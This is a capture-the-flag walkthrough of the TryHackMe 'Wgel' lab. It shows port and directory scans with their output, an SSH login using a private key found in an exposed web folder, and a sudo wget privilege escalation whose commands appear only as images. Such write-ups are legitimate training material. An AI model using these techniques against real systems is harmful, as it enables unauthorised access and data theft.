
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-1.png)
I found a ssh folder which containes a ssh key which i used to login via ssh, annd finally i take advantage of the sudo rights on the wget command.

Nmap scan
```text
nmap -sS -T 4 -p- 10.10.144.149
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 04:55 EDT
Nmap scan report for 10.10.122.219
Host is up (0.068s latency).
Not shown: 65136 closed ports, 397 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The detailed scan
```text
nmap -sV -sC  -T 4 -p22,80 10.10.144.149
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 04:59 EDT
Nmap scan report for 10.10.122.219
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80 is this ubuntu's default page.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-2.png)

The source has this comment with an username which will be useful in the future.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-3.png)

I got stuck, so i wil bruteforce directories.

```text
 gobuster dir -u http://10.10.144.149 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.144.149
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 05:30:48 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/sitemap (Status: 301)
```


The sitemap is a basic template, but it may hold other interesting files.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-4.png)


The .ssh folder seems promising.
```text
 gobuster dir -u http://10.10.144.149/sitemap/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.144.149/sitemap/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 05:41:55 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
```
  
Here is the rsa key that would be useful when login via ssh.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-5.png)

To login via ssh using a private key, the permissions of the file needs to be set.
```text
chmod 600 id_rsa
```
ssh -i id_rsa jessie@10.10.144.149

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-6.png)

After a bit of searching i found the user flag in the Documents folder.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-7.png)

Let's see what sudo rights has jessie.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-8.png)

This privesc is a bit different from what i am used to, but it was welcomed as i learned something new.First, start a listener on port 80 and redirect any output to a file.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-9.png)

Second use the command below.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Wgel/images/79-10.png)

Lastly, read the flag.  

#### Referrences
https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/
